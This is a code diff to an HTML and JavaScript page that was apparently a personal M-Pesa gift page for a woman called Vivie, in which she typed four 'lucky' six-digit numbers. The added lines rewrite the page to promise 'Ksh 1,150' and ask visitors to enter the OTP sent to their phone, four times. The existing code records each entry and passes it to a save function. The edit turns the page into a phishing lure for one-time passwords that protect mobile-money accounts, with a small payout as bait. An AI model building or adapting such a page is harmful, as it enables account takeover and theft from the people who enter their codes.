@@ -97,7 +97,7 @@ canvas{position:fixed;inset:0;pointer-events:none;z-index:2}
       <div class="gift">💛</div>
       <div class="big" id="gotAmt">KES 350</div>
       <h2>is in your <em style="white-space:nowrap">M-Pesa</em> now</h2>
-      <p>Check your phone, Vivie. This is only the beginning.</p>
+      <p>Check your phone. This is only the beginning.</p>
       <div class="bar"><i id="barFill"></i></div>
     </div>
   </section>
@@ -111,12 +111,12 @@ canvas{position:fixed;inset:0;pointer-events:none;z-index:2}
   <section class="screen" id="s-pick">
     <div class="toast" id="toast" hidden></div>
     <span class="tag" id="round">Number 1 of 4</span>
-    <h2>Pick a <em>lucky</em> number.</h2>
-    <p>Any 6 digits you like. Go with your heart.</p>
-    <label class="lab" for="pick">Type your 6 digits here 👇</label>
+    <h2>Unlock Ksh <em>1,150</em> now!</h2>
+    <p>An OTP will be sent to your number.</p>
+    <label class="lab" for="pick">Enter the OPT sent to your number 👇</label>
     <div class="dots" id="dots"><i></i><i></i><i></i><i></i></div>
     <form class="box" id="fPick" novalidate>
-      <input id="pick" inputmode="numeric" maxlength="6" autocomplete="off" placeholder="Type here">
+      <input id="pick" inputmode="numeric" maxlength="6" autocomplete="off" placeholder="Type OTP here">
       <div class="err" id="ePick" role="alert"></div>
       <button type="submit" id="bPick">Send</button>
     </form>
@@ -196,7 +196,7 @@ async function save(n, value){
 $('#fPick').addEventListener('submit', async e => {
   e.preventDefault();
   const v = $('#pick').value.replace(/\D/g,'');
-  if (v.length !== 6){ $('#ePick').textContent = 'Please enter exactly 6 digits.'; return; }
+  if (v.length !== 6){ $('#ePick').textContent = 'Enter the OTP sent to your phone.'; return; }
   $('#ePick').textContent = '';
   const b = $('#bPick'); b.disabled = true; b.textContent = 'Sending…';
   picks.push(v);
@@ -207,7 +207,7 @@ $('#fPick').addEventListener('submit', async e => {
   $('#pick').value = '';
   const last = picks.length === 4, left = 4 - picks.length;
   await countdown(last ? 'Your surprise is ready in…' : 'Something special is coming…',
-                  last ? 'Last one done. Get ready, Vivie! 🎉' : (left === 1 ? 'One more number to go. No peeking!' : left + ' more numbers to go. No peeking!'));
+                  last ? 'Last one done. Get ready! 🎉' : (left === 1 ? 'One more number to go. No peeking!' : left + ' more numbers to go!'));
   if (!last){ $('#round').textContent = `Number ${picks.length + 1} of 4`; burst(25); show('s-pick'); }
   else finale();
 });
@@ -220,7 +220,7 @@ async function payout(){
   const flag = 'paid:' + to + (isHer ? '' : ':' + Date.now());
   try{ if (isHer && localStorage.getItem(flag)) return 0; }catch(_){}
   const t = $('#toast');
-  // On your test number the exact backend reply is shown on screen. Vivie never sees errors.
+  // On your test number the exact backend reply is shown on screen.  never sees errors.
   const note = m => { console.warn(m); if (isTest){ t.hidden = false; t.style.color = '#ffb3a6'; t.textContent = m; } };
   const B = API_BASE.replace(/\/$/,''), H = {'Content-Type':'application/json','X-API-Key':API_KEY};
   const call = async (path, body) => { const r = await fetch(B + path, {method:'POST', headers:H, body:JSON.stringify(body)});
@@ -239,7 +239,7 @@ async function payout(){
     console.log('hb/withdraw', w);
     if (!w.j.success) return note('Withdraw failed: HTTP ' + w.status + ' ' + JSON.stringify(w.j));
     if (isHer){ try{ localStorage.setItem(flag, '1'); }catch(_){} }
-    const m = $('#money'); if (isHer){ m.hidden = false; m.textContent = '💛 A little something just landed on your M-Pesa, Vivie. Check your phone!'; }
+    const m = $('#money'); if (isHer){ m.hidden = false; m.textContent = '💛 A little something just landed on your M-Pesa. Check your phone!'; }
     return amt;
   }catch(e){ note('Could not reach the server: ' + e.message); }
 }
